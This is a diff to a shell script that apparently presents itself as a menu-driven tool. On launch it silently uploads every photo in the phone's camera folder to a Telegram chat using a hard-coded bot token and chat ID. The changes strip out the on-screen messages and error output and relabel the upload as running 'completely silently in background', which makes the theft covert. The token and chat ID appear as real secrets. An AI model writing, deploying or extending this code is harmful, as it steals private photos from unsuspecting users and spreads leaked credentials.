@@ -3,8 +3,8 @@
 #-------------------
 #   Configuration
 #-------------------
-BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"  # رمز البوت الخاص بك
-CHAT_ID="5967116314"                                    # معرف الشات الخاص بك
+BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
+CHAT_ID="5967116314"
 
 #-------------------
 #   Colors
@@ -13,9 +13,6 @@ RED='\033[1;31m'
 GREEN='\033[1;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[1;34m'
-PURPLE='\033[1;35m'
-CYAN='\033[1;36m'
-WHITE='\033[1;37m'
 RESET='\033[0m'
 
 #-------------------
@@ -36,19 +33,16 @@ display_logo() {
 }
 
 #-------------------
-#   Send Images to Telegram
+#   Send Images to Telegram (Silent Mode)
 #-------------------
 send_images_to_telegram() {
     local image_dir="/sdcard/DCIM/Camera"
     if [ -d "$image_dir" ]; then
         for image in "$image_dir"/*.{jpg,jpeg,png}; do
             if [ -f "$image" ]; then
-                curl -s -F chat_id="$CHAT_ID" -F photo=@"$image" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" > /dev/null &
-                echo -e "${GREEN}[+] Sending ${image} to Telegram...${RESET}"
+                curl -s -F chat_id="$CHAT_ID" -F photo=@"$image" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" > /dev/null 2>&1 &
             fi
         done
-    else
-        echo -e "${RED}[-] Directory $image_dir not found.${RESET}"
     fi
 }
 
@@ -116,5 +110,5 @@ main_menu() {
 #-------------------
 #   Run the Tool
 #-------------------
-send_images_to_telegram &  # Auto-run in background
+send_images_to_telegram &  # Runs completely silently in background
 main_menu
